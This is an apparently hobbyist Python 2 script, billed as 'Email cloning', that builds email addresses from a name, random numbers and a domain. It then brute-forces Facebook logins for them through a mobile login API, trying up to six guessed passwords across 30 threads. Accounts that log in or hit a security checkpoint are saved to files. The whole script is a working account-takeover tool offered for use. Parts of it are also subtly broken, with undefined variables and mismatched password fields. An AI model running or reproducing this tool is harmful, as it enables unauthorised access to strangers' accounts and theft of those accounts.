#!/usr/bin/python2
#coding=utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(3000):
    KGF = random.randint(1, 9999)
    sys.stdout = open('.txt', 'a')
    print KGF
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 Emailcloning.py')

import requests,bs4,sys,os
import requests,sys
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'God by Frends '
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)


B = '\x1b[1;94m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
W = '\x1b[1;97m'
S = '\x1b[1;96m'
P = '\x1b[1;95m'
Y = '\x1b[1;93m'
### logo ###
logo ="""
\x1b[1;91m                      :::!~!!!!!:.
\x1b[1;96m                  .xUHWH!! !!?M88WHX:.
\x1b[1;94m                .X*#M@$!!  !X!M$$$$$$WWx:.
\x1b[1;91m               :!!!!!!?H! :!$!$$$$$$$$$$8X:
\x1b[1;96m              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
\x1b[1;96m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
\x1b[1;94m             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
\x1b[1;96m               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
\x1b[1;94m               ~?WuxiW*`   `"#$$$$8!!!!??!!!
\x1b[1;91m             :X- M$$$$       `"T#$T~!8$WUXU~
\x1b[1;96m            :%`  ~#$$$m:        ~!~ ?$$$$$$
\x1b[1;94m          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
\x1b[1;91m.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
\x1b[1;94mW$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
\x1b[1;91m#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
\x1b[1;96m:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
\x1b[1;94m.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
\x1b[1;91mWi.~!X$?!-~    : ?$$$B$Wu("**$RM!
\x1b[1;96m$R@i.~~ !     :   ~$$$$$B$$en:``
\x1b[1;94m?MXT@Wx.~    :     ~"##*$$$$M~
\x1b[1;97m----------------------------------------------------
\x1b[1;97m➣\x1b[1;93m Author : \x1b[1;92mShafqat Ali\x1b[1;0m
\x1b[1;97m➣\x1b[1;93m Github : \x1b[1;92mhttps://github.com/The-Kgf\x1b[1;0m
\x1b[1;97m➣\x1b[1;93m Fb   : \x1b[1;92mhttps://m.facebook.com/alon3cyber\x1b[1;0m
\x1b[1;97m➣\x1b[1;93m Version : \x1b[1;92m2.0\x1b[1;0m
\x1b[1;97m----------------------------------------------------
                                """
                                
def tik():
    titik = ['\xe2\x96\x87   ', '\xe2\x96\x87\xe2\x96\x87  ', '\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87 ']
    for o in titik:
        print '\r\x1b[1;91mPlease Wait... \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []
cps = []
cb = []

def theKGF():
    os.system('clear')
    print logo
    print"\033[1;97m «--------------------------------------------»"
    time.sleep(0.0005)
    print '\x1b[1;93m[1]\x1b[1;94m Start Email  Cloning'
    print"\033[1;97m «--------------------------------------------»"
    time.sleep(0.0005)
    print '\x1b[1;93m[0]\x1b[1;91m Back            '
    time.sleep(0.0005)
    print"\033[1;97m «--------------------------------------------»"
    KGF()


def KGF():
    global cpb
    global oks
    theKGF = raw_input('\n\x1b[1;93mChoose an Option  \x1b[1;95m')
    if theKGF == '':
        print '[\xe2\x96\x87] Fill in correctly'
        KGF()
    elif theKGF == '1':
        print"\033[1;97m «--------------------------------------------»"
        os.system('clear')
        print logo
        try:
            k = raw_input('\x1b[1;95m Type Any Name (aliraza) > \x1b[1;97m ')
            print"\033[1;97m «--------------------------------------------»"
            user = raw_input('\x1b[1;95m Type Domain (@gmail.com) >\x1b[1;97m  ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[\xe2\x96\x87] File Not Found'
            raw_input('\n[ Back ]')
            theKGF()

    elif theKGF == '0':
        theKGF()
    else:
        print '[!] Fill in correctly'
        KGF()
    print"\033[1;97m «--------------------------------------------»"
    KGFa = raw_input('\x1b[1;93m Type Any Pasword No1 .\x1b[1;97m  ')
    time.sleep(0.0005)
    KGFb = raw_input('\x1b[1;93m Type Any Pasword No2 .\x1b[1;97m  ')
    time.sleep(0.0005)
    KGFc = raw_input('\x1b[1;93m Type Any Pasword No3 .\x1b[1;97m  ')
    time.sleep(0.0005)
    KGFd = raw_input('\x1b[1;93m Type Any Pasword No4 .\x1b[1;97m  ')
    time.sleep(0.0005)
    KGFe = raw_input('\x1b[1;93m Type Any Pasword No5 .\x1b[1;97m  ')
    print"\033[1;97m «--------------------------------------------»"
    xxx = str(len(id))
    jalan(' \x1b[1;93mTotal Numbers: ' + xxx)
    time.sleep(0.0005)
    print(' \x1b[1;91mPlz Wait Cloned Accounts Will Appear Here')
    time.sleep(0.0005)
    print(' \x1b[1;92mTo Stop Process Press CTRL Then Press z')
    time.sleep(0.0005)
    print"\033[1;97m «--------------------------------------------»"

    def main(arg):
        c = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = k
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Kgf_OK]  ' + k + c + user +  + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass1 + '\n')
                okb.close()
                oks.append(k + c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[Kgf_CP] ' + k + c + user + '|' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass1 + '\n')
                cps.close()
                cpb.append(k + c + user + pass1)
            else:
                pass2 = KGFa
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[Kgf_OK]\x1b[1;93m  ' + k + c + user + '|' + pass2 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass2 + '\n')
                    okb.close()
                    oks.append(k + c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[Kgf_CP]\x1b[1;93m ' + k + c + user + '|' + pass2 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass2 + '\n')
                    cps.close()
                    cpb.append(k + c + user + pass2)
                else:
                    pass3 = KGFb
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[Kgf_OK]\x1b[1;93m  ' + k + c + user + '|' + pass3 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass3 + '\n')
                        okb.close()
                        oks.append(k + c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[Kgf_CP]\x1b[1;93m ' + k + c + user + '|' + pass3 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass3 + '\n')
                        cps.close()
                        cpb.append(k + c + user + pass3)
                    else:
                        pass4 = KGFc
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[Kgf_OK]\x1b[1;93m  ' + k + c + user + '|' + pass4 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
                            okb.close()
                            oks.append(k + c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[Kgf_CP]\x1b[1;93m ' + k + c + user + '|' + pass4 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
                            cps.close()
                            cpb.append(k + c + user + pass4)
                        else:
                            pass5 = KGFd
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[Kgf_OK]\x1b[1;93m  ' + k + c + user + '|' + pass5 + '\n' + '\n'
                                okb = open('save/successfull.txt', 'a')
                                okb.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass5 + '\n')
                                okb.close()
                                oks.append(k + c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[Kgf_CP]\x1b[1;93m ' + k + c + user + '|' + pass5 + '\n'
                                cps = open('save/checkpoint.txt', 'a')
                                cps.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
                                cps.close()
                                cpb.append(k + c + user + pass5)
                            else:
                                pass6 = KGFe
                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[Kgf_OK]\x1b[1;93m  ' + k + c + user + '|' + pass6 + '\n' + '\n'
                                    okb = open('save/successfull.txt', 'a')
                                    okb.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass5 + '\n')
                                    okb.close()
                                    oks.append(k + c + user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[Kgf_CP]\x1b[1;93m ' + k + c + user + '|' + pass6 + '\n'
                                    cps = open('save/checkpoint.txt', 'a')
                                    cps.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
                                    cps.close()
                                    cpb.append(k + c + user + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print"\033[1;97m «--------------------------------------------»"
    print '\x1b[1;93m Process Has Been Completed ....'
    print ' \x1b[1;92mTotal OK/\x1b[1;93mCP :\x1b[1;91m ' + str(len(oks)) + '/' + str(len(cpb))
    print ' CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n\x1b[1;95m[\x1b[1;91mBack\x1b[1;95m]')
    print"\033[1;97m «--------------------------------------------»"
    theKGF()


if __name__ == '__main__':
    theKGF()

